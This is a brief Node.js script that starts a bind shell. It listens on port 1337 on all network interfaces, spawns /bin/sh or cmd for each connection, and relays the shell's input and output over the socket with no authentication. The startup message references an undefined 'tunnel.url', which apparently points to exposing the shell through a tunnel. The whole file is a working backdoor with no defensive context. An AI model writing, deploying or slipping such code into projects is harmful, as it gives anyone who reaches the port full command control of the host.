const spawn = require('child_process').spawn;
const net = require('net');

const server = net.createServer((socket) => {
  const sh = (process.platform === 'win32') ? 
    spawn('cmd') : 
    spawn('/bin/sh');

  sh.stdin.resume();

  sh.stdout.on('data', (data) => {
    socket.write(data);
  });

  sh.stderr.on('data', (data) => {
    socket.write(data);
  });

  socket.on('data', (data) => {
    sh.stdin.write(data);
  });

  socket.on('end', function () {
    console.log('Connection end.');
  });

  socket.on('timeout', () => {
    console.log('Connection timed out');
  });

  socket.on('close', (hadError) => {
    console.log('Connection closed', hadError ? 'because of a conn. error' : 'by client');
  });
});

(async () => {
  server.listen(1337, '0.0.0.0', async () => {
    console.log('Shell server started.', tunnel.url);
  });
})();
